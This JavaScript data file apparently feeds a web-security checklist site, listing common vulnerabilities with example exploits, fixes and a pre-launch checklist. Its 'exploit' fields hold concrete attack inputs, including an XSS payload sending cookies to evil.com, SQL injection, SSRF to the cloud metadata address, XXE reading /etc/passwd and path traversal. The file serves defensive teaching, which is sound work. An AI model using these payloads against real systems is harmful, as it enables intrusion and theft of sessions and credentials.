export const tableOfContents = [
  { id: 's1', num: 1, title: 'Environment Variables & .env', icon: '🔐' },
  { id: 's2', num: 2, title: 'Error Handling & Validation', icon: '⚠️' },
  { id: 's3', num: 3, title: 'Input Validation & Sanitisation', icon: '✅' },
  { id: 's4', num: 4, title: 'Rate Limiting', icon: '⏱️' },
  { id: 's5', num: 5, title: 'HTTPS Certificate & Redirect', icon: '🔒' },
  { id: 's6', num: 6, title: 'Image Optimisation', icon: '🖼️' },
  { id: 's7', num: 7, title: 'Custom 404 Page', icon: '🚫' },
  { id: 's8', num: 8, title: 'Dead Links & Endpoint Testing', icon: '🔗' },
  { id: 's9', num: 9, title: 'Analytics: GA / PostHog', icon: '📊' },
  { id: 's10', num: 10, title: 'Remove console.log', icon: '🧹' },
  { id: 's11', num: 11, title: 'Sentry Error Monitoring', icon: '🚨' },
  { id: 's12', num: 12, title: 'Auth Providers', icon: '🔑' },
  { id: 's13', num: 13, title: 'Responsiveness Testing', icon: '📱' },
  { id: 's14', num: 14, title: 'Vulnerabilities & Fixes', icon: '💀' },
  { id: 's15', num: 15, title: 'CORS Configuration', icon: '🌐' },
  { id: 's16', num: 16, title: 'Password Hashing & Sessions', icon: '🔏' },
  { id: 's17', num: 17, title: 'API Security & Versioning', icon: '📡' },
  { id: 's18', num: 18, title: 'CI/CD Pipeline Security', icon: '🔧' },
  { id: 's19', num: 19, title: 'Docker & Container Security', icon: '🐳' },
  { id: 's20', num: 20, title: 'Cloud Security Basics', icon: '☁️' },
  { id: 's21', num: 21, title: 'Backup & Recovery', icon: '💾' },
  { id: 's22', num: 22, title: 'Log Management', icon: '📝' },
  { id: 's23', num: 23, title: 'Webhook Security', icon: '🪝' },
  { id: 's24', num: 24, title: 'GraphQL Security', icon: '◈' },
]

export const vulnerabilities = [
  {
    severity: 'CRITICAL',
    title: 'SQL Injection',
    exploit: "Input ' OR '1'='1 into a login form with raw SQL to bypass auth or dump the entire database.",
    fix: 'Always use parameterised queries or an ORM (Prisma, Sequelize). Never concatenate user input into SQL strings.'
  },
  {
    severity: 'CRITICAL',
    title: 'XSS (Cross-Site Scripting)',
    exploit: "Store <script>document.location='https://evil.com?c='+document.cookie</script> in a comment field to steal session cookies.",
    fix: 'Sanitise all HTML with DOMPurify. Set Content-Security-Policy headers. Use HttpOnly cookies so JS cannot read them.'
  },
  {
    severity: 'CRITICAL',
    title: 'Broken Auth / Weak Sessions',
    exploit: 'Brute-force a login with common passwords. Steal a JWT from localStorage. Predict a weak session token.',
    fix: 'Rate-limit auth endpoints. Store JWTs in HttpOnly cookies, not localStorage. Use a battle-tested auth provider. Enforce MFA.'
  },
  {
    severity: 'CRITICAL',
    title: 'Exposed .env / Secrets',
    exploit: 'Visit /api/.env or check GitHub history for accidentally committed secrets. One leaked key equals full database access.',
    fix: 'Add .env to .gitignore. Use secret scanning (GitHub Advanced Security or git-secrets). Rotate any leaked key immediately.'
  },
  {
    severity: 'CRITICAL',
    title: 'SSRF (Server-Side Request Forgery)',
    exploit: "Send url=http://169.254.169.254/latest/meta-data/ to steal AWS credentials from cloud metadata service.",
    fix: 'Validate and whitelist all URLs. Never accept user-provided URLs directly. Use allowlists for IP ranges and domains.'
  },
  {
    severity: 'CRITICAL',
    title: 'XXE (XML External Entity)',
    exploit: 'Upload XML with <!DOCTYPE foo SYSTEM "file:///etc/passwd"> to read server files or perform DoS attacks.',
    fix: 'Disable XML external entity processing. Use JSON APIs when possible. Sanitise file uploads thoroughly.'
  },
  {
    severity: 'HIGH',
    title: 'CSRF (Cross-Site Request Forgery)',
    exploit: 'Trick a logged-in user into visiting a page that silently submits a form to your app, changing their email or making a purchase.',
    fix: 'Use CSRF tokens on all state-changing forms. Set SameSite=Strict on cookies. Verify Origin and Referer headers.'
  },
  {
    severity: 'HIGH',
    title: 'IDOR (Insecure Direct Object Reference)',
    exploit: "Change /api/orders/1234 to /api/orders/1235 to view another user's order without permission.",
    fix: 'Always check that req.user.id equals resource.ownerId before returning data. Never rely on obscurity alone.'
  },
  {
    severity: 'HIGH',
    title: 'Path Traversal',
    exploit: 'Send filename=../../../../etc/passwd to a file download endpoint to read system files.',
    fix: 'Use path.basename() to strip directory components. Resolve paths and verify they are inside the allowed directory.'
  },
  {
    severity: 'HIGH',
    title: 'Unrestricted File Upload',
    exploit: 'Upload a .php or .js file disguised as an image. If the server executes it, full Remote Code Execution (RCE) is possible.',
    fix: 'Validate MIME type AND extension. Rename uploaded files (never trust the original name). Store uploads outside the web root.'
  },
  {
    severity: 'HIGH',
    title: 'Dependency Vulnerabilities',
    exploit: 'Use a package with a known CVE (e.g., an old version of jsonwebtoken) to forge tokens or execute code via a supply chain attack.',
    fix: 'Run npm audit weekly. Enable Dependabot or Snyk. Pin major versions. Never install packages from unofficial sources.'
  },
  {
    severity: 'HIGH',
    title: 'Missing Security Headers',
    exploit: 'Embed your site in an iframe (clickjacking), execute inline scripts (XSS), or downgrade to HTTP (MITM attack).',
    fix: 'Use helmet to set CSP, X-Frame-Options, X-Content-Type-Options, HSTS, and Referrer-Policy headers.'
  },
  {
    severity: 'HIGH',
    title: 'Prototype Pollution',
    exploit: 'Send __proto__ or constructor in JSON to inject malicious properties into JavaScript objects at runtime.',
    fix: 'Validate JSON input with JSON Schema. Freeze Object.prototype. Use Object.freeze() on config objects. Use safe libraries.'
  },
  {
    severity: 'MEDIUM',
    title: 'Race Conditions',
    exploit: 'Transfer $100 twice by sending two requests simultaneously before the balance check completes.',
    fix: 'Use database transactions with proper isolation levels. Implement optimistic or pessimistic locking on critical operations.'
  },
  {
    severity: 'MEDIUM',
    title: 'Open Redirects',
    exploit: '/redirect?url=https://evil.com — phishing emails use your trusted domain to redirect victims to malware sites.',
    fix: 'Whitelist allowed redirect URLs. Never redirect to a user-supplied URL without validation. Use relative paths where possible.'
  },
  {
    severity: 'MEDIUM',
    title: 'Information Disclosure',
    exploit: 'Error messages reveal stack traces, database schemas, or file paths. The X-Powered-By header reveals your tech stack.',
    fix: 'Return generic error messages in production. Use helmet to remove X-Powered-By. Never expose internal paths or query details.'
  },
  {
    severity: 'MEDIUM',
    title: 'No Rate Limiting on Auth',
    exploit: 'Automate 10,000 login attempts per minute using a credential stuffing list of username/password pairs from previous data breaches.',
    fix: 'Add strict rate limiting (5 attempts / 10 minutes) on all auth endpoints. Add account lockout with exponential backoff.'
  },
  {
    severity: 'MEDIUM',
    title: 'Mass Assignment',
    exploit: 'Send {"role": "admin"} in a registration payload if the server blindly passes req.body to the ORM.',
    fix: 'Explicitly whitelist allowed fields. Never pass raw req.body to database operations. Use DTOs or schema validation.'
  },
  {
    severity: 'MEDIUM',
    title: 'GraphQL Introspection Abuse',
    exploit: 'Query __schema to map out entire API structure, then exploit hidden fields or mutations.',
    fix: 'Disable introspection in production. Use query complexity limits. Implement depth limiting to prevent nested queries.'
  },
  {
    severity: 'MEDIUM',
    title: 'ReDoS (Regex DoS)',
    exploit: "Send 'aaaaaaaaaaaaaaaaa!' to a poorly written regex like /(a+)+$/ which causes exponential backtracking.",
    fix: 'Test regex with evil inputs. Use atomic groups or possessive quantifiers. Avoid nested quantifiers. Profile regex performance.'
  },
  {
    severity: 'MEDIUM',
    title: 'WebSocket Hijacking',
    exploit: 'Exploit missing origin validation on WebSocket connections to receive sensitive real-time data.',
    fix: 'Validate Origin header on WebSocket handshake. Use wss:// (TLS). Implement authentication tokens in connection params.'
  },
  {
    severity: 'LOW',
    title: 'Verbose 404/500 Pages',
    exploit: 'Default error pages reveal framework version, server OS, or even source file paths — useful intel for attackers.',
    fix: 'Use custom 404 and 500 pages with no technical details. Log full errors server-side only (Sentry). Show friendly messages to users.'
  },
  {
    severity: 'LOW',
    title: 'console.log Leaking Data',
    exploit: 'Anyone who opens DevTools can see tokens, passwords, user data, or API keys logged during development if not removed before launch.',
    fix: 'Use the ESLint no-console rule. Use Babel plugin to strip all console calls in production builds. Replace with structured logger (pino).'
  },
]

export const checklists = [
  'Run npm audit — zero high/critical vulnerabilities',
  'Test with OWASP ZAP or Burp Suite (free community editions)',
  'Run headers check at securityheaders.com',
  'Run SSL check at ssllabs.com/ssltest',
  'No API keys or secrets in git history (git log -S \'sk_\')',
  'All auth endpoints have rate limiting',
  'Helmet middleware installed and configured',
  'All user inputs validated with Zod or express-validator',
  'JWT stored in HttpOnly cookie, not localStorage',
  'File uploads validated for type, size, and renamed on save',
  'Sentry set up and sending alerts to email',
  'All console.log removed or stripped by build',
  'HTTPS enforced with 301 redirect and HSTS header',
  'Custom 404 page with Go Home and Go Back links',
  'No stack traces or internal errors shown to users',
  'Environment variables validated at startup',
  'CORS configured with explicit origin allowlist',
  'Passwords hashed with bcrypt (cost factor >= 12)',
  'Session IDs regenerated after login',
  'Database connections use SSL/TLS',
  'Docker containers run as non-root user',
  'No secrets hardcoded in CI/CD pipelines',
  'Cloud metadata endpoint blocked from app server',
  'Backups encrypted and recovery tested quarterly',
  'Logs shipped to centralized system (not local files only)',
  'Webhook payloads verified with HMAC signatures',
  'GraphQL introspection disabled in production',
  'Query depth and complexity limits set',
]
